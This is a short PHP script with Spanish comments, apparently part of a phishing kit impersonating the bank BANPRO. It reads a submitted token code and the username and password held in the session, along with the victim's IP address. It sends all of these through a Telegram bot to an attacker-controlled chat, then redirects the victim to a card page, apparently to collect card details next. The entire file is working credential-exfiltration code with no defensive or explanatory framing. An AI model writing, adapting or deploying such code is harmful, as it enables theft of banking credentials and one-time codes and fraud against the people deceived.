<?php
// Incluir el archivo de configuración
$config = include('config.php');

// Verificar si los datos de configuración existen
if (!isset($config['token']) || !isset($config['chat_id'])) {
    echo "Error: Configuración de Telegram no encontrada.";
    exit;
}

// Obtener los valores de configuración
$token = $config['token'];
$chat_id = $config['chat_id'];

// Obtener el código enviado desde el formulario
$codigo = isset($_POST['ips1']) ? htmlspecialchars($_POST['ips1']) : '';

// Verificar si hay sesión previa
$u1 = $_SESSION['U1'] ?? 'Desconocido';
$p1 = $_SESSION['P1'] ?? 'Desconocido';

// Validar que el código no esté vacío
if (empty($codigo)) {
    echo "Error: El campo código es obligatorio.";
    exit;
}

// Obtener la IP del cliente
$ip = $_SERVER['REMOTE_ADDR'];

// Crear el mensaje
$mensaje = "BANPRO TOK 1> IP: $ip - USE: $u1 - CSS: $p1 - TK: $codigo";

// Enviar el mensaje a Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje
];

// Usar cURL para realizar la solicitud
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
if ($response === false) {
    echo "Error al enviar el mensaje: " . curl_error($ch);
    exit;
}

// Cerrar cURL
curl_close($ch);

// Redirigir después de enviar el mensaje
header("Location: card.html");
exit;
?>

